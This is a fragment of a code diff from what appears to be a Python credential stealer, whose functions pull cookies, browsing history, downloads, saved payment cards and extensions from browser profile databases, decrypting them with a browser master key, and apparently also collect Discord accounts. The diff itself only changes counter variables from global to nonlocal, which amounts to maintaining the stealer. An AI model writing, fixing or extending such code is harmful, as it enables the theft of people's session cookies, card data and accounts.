@@ -874,7 +874,7 @@ Discord Hesabin °{str(number_discord_account)}:
             conn.close()
 
         def GetCookies(browser, profile_path, master_key):
-            global number_cookies
+            nonlocal number_cookies
             cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
             if not os.path.exists(cookie_db):
                 return
@@ -901,7 +901,7 @@ Discord Hesabin °{str(number_discord_account)}:
             conn.close()
 
         def GetHistory(browser, profile_path):
-            global number_history
+            nonlocal number_history
             history_db = os.path.join(profile_path, 'History')
             if not os.path.exists(history_db):
                 return
@@ -926,7 +926,7 @@ Discord Hesabin °{str(number_discord_account)}:
             conn.close()
         
         def GetDownloads(browser, profile_path):
-            global number_downloads
+            nonlocal number_downloads
             downloads_db = os.path.join(profile_path, 'History')
             if not os.path.exists(downloads_db):
                 return
@@ -949,7 +949,7 @@ Discord Hesabin °{str(number_discord_account)}:
             conn.close()
         
         def GetCards(browser, profile_path, master_key):
-            global number_cards
+            nonlocal number_cards
             cards_db = os.path.join(profile_path, 'Web Data')
             if not os.path.exists(cards_db):
                 return
@@ -976,7 +976,7 @@ Discord Hesabin °{str(number_discord_account)}:
             conn.close()
 
         def GetExtentions(zip_file, extensions_names, browser, profile_path):
-            global number_extentions
+            nonlocal number_extentions
             extensions_path = os.path.join(profile_path, 'Extensions')
             zip_folder = os.path.join("Extensions", browser)
 
